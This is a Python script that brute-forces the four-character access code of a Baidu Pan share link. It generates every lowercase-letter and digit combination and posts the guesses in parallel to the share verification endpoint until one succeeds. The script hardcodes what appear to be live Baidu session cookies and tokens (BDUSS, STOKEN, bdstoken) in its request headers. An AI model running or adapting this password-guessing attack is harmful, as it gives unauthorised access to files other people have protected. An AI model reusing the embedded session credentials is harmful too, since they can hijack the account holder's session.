#!usr/bin/env python  
#-*- coding:utf-8 -*-
import execjs
import time
import requests
import string
import itertools
import os
from multiprocessing import pool
class Wangpan():
    def __init__(self,url):
        self.url = url
    # 生成四位密码 a-z 0-9
    def generateNumKey(self,num):
        f = open('./passwd.txt', 'w')
        alist = list(string.ascii_lowercase + string.digits)  # 数据源是a-z,0-9
        for i in itertools.product(alist, repeat=num):
            passwd = ''.join(list(i)) + '\n'
            f.write(passwd)
        f.close()

    def logid(self,data):
        js = execjs.compile(open('./wangpan.js','r',encoding='utf-8').read())
        return js.call('get_logid',data)

    def deal_info(self,pwd):
        headers = {
            'Cookie': 'BAIDUID=D5D5D0A4A24CD35F982ACA0D078D1321:FG=1; BIDUPSID=D5D5D0A4A24CD35F982ACA0D078D1321; PSTM=1565859928; PANWEB=1; BDUSS=1kYVNZZEdIN0lnZHdtMEt4T2lRU1hlVUdZUTBSUXdSTE93Mzg1VUtJR0o1WHhkRVFBQUFBJCQAAAAAAAAAAAEAAABrCE2TuPHSy7eozaUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIlYVV2JWFVdcy; SCRC=fb18ba00409b0ec421bf4d578c2498d8; STOKEN=4766b73ebdc2646f73605f4bb26b01e67db5f4f1238a17863aaa1bda0dd10c78; MCITY=-%3A; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; BDCLND=8IoeOinL2X9JvOhsFKRcCEG0rC7PNq3M; yjs_js_security_passport=e22de7d43408ad3d44b4fd6725be1b5e30b9f371_1567779161_js; H_PS_PSSID=29634_1426_21117_29522_29519_29721_29568_29221_26350; delPer=0; PSINO=7; Hm_lvt_7a3960b6f067eb0085b7f96ff5e660b0=1565874110,1566117098,1567513070,1567852984; PANPSC=823783061956451446%3Ahj8FSdEzFdp6%2FrcF8ezcDGcohJxoEIVK7TyJio%2FJTklfzTjg0kK4swh%2F%2FMKGPdxiCOfgdHnp149roe9aWY1jLSXrdUjN%2B66wg0mIZdLHpdSGoGvmQeuptneqy7QEf8FyX2XlUsKRi0awbthkud9n5a%2F6Ni0tMxHeQjQ1mFHTd8W55I5Cval%2Bkn1t8VXlRfZV; Hm_lpvt_7a3960b6f067eb0085b7f96ff5e660b0=1567860484',
            'Referer': 'https://pan.baidu.com/share/init?surl={}'.format(self.url.split('=')[-1]),
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'
        }
        params = {
            'surl': self.url.split('=')[-1],
            't': int(time.time()*1000),
            'channel': 'chunlei',
            'web': '1',
            'app_id':'250528',
            'bdstoken': '4c691f9b37c1676fd07ea495ad54d345',
            'logid':self.logid('D5D5D0A4A24CD35F982ACA0D078D1321'),
            'clienttype': '0'
        }
        data = {
            'pwd': pwd,
            'vcode':'',
            'vcode_str':''
        }

        response = requests.post(self.url,params=params,data=data,headers=headers)
        if response.json()['errno'] ==0:
            print(pwd)
            print(response.json())
            os._exit(0)
        else:
            print('{},密码错误！'.format(pwd))
if __name__ == '__main__':
    f = open('tt.txt', 'r')
    pwd_list = [pwd.replace('\n','') for pwd in f.readlines()]
    url = 'https://pan.baidu.com/share/verify?surl=4ee4GP9TWjBVA8gvwCg9Zg'
    wangpan = Wangpan(url)
    p = pool.Pool(10)
    p.map(wangpan.deal_info,pwd_list)




